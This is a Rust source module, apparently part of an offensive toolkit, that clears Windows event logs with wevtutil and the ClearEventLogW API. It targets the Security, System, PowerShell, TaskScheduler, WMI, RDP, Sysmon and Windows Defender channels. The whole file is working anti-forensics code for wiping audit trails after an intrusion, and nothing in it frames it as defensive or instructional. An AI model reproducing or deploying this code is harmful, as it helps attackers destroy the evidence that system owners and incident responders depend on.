#![cfg(target_os = "windows")]
/*
 * event_log.rs — Windows Event Log clearing
 *
 * Primary path: wevtutil.exe cl <channel>
 * Fallback: OpenEventLog + ClearEventLog (advapi32)
 *
 * Channels cleared:
 *   System, Security, Application, Setup
 *   Microsoft-Windows-PowerShell/Operational
 *   Microsoft-Windows-PowerShell/Admin
 *   Microsoft-Windows-TaskScheduler/Operational
 *   Microsoft-Windows-WMI-Activity/Operational
 *   Microsoft-Windows-TerminalServices-LocalSessionManager/Operational
 *   Microsoft-Windows-Sysmon/Operational (if present)
 */

use std::process::Command;
use windows_sys::Win32::{
    Foundation::*,
    System::EventLog::*,
};

static CHANNELS: &[&str] = &[
    "System",
    "Security",
    "Application",
    "Setup",
    "Microsoft-Windows-PowerShell/Operational",
    "Microsoft-Windows-PowerShell/Admin",
    "Microsoft-Windows-TaskScheduler/Operational",
    "Microsoft-Windows-WMI-Activity/Operational",
    "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational",
    "Microsoft-Windows-RemoteDesktopServices-RdpCoreTS/Operational",
    "Microsoft-Windows-Sysmon/Operational",
    "Microsoft-Windows-Windows Defender/Operational",
];

fn wevtutil_clear(channel: &str) -> bool {
    Command::new("wevtutil")
        .args(["cl", channel])
        .status()
        .map(|s| s.success())
        .unwrap_or(false)
}

fn clear_event_log_api(channel: &str) -> bool {
    use std::ffi::OsStr;
    use std::os::windows::ffi::OsStrExt;

    let source: Vec<u16> = OsStr::new(channel).encode_wide().chain(Some(0)).collect();

    unsafe {
        let handle = OpenEventLogW(std::ptr::null(), source.as_ptr());
        if handle == 0 { return false; }

        let r = ClearEventLogW(handle, std::ptr::null());
        CloseEventLog(handle);
        r != 0
    }
}

#[derive(Debug, Default)]
pub struct EventLogStats {
    pub cleared: u32,
    pub failed:  u32,
}

pub fn clear_all_event_logs(verbose: bool) -> EventLogStats {
    let mut stats = EventLogStats::default();

    for channel in CHANNELS {
        if verbose { eprint!("[*] event_log: clearing {}...", channel); }

        let ok = wevtutil_clear(channel) || clear_event_log_api(channel);

        if ok {
            if verbose { eprintln!(" OK"); }
            stats.cleared += 1;
        } else {
            if verbose { eprintln!(" SKIP (not present or no permission)"); }
            stats.failed += 1;
        }
    }

    eprintln!("[+] event_log: {}/{} channel(s) cleared",
        stats.cleared, CHANNELS.len());
    stats
}
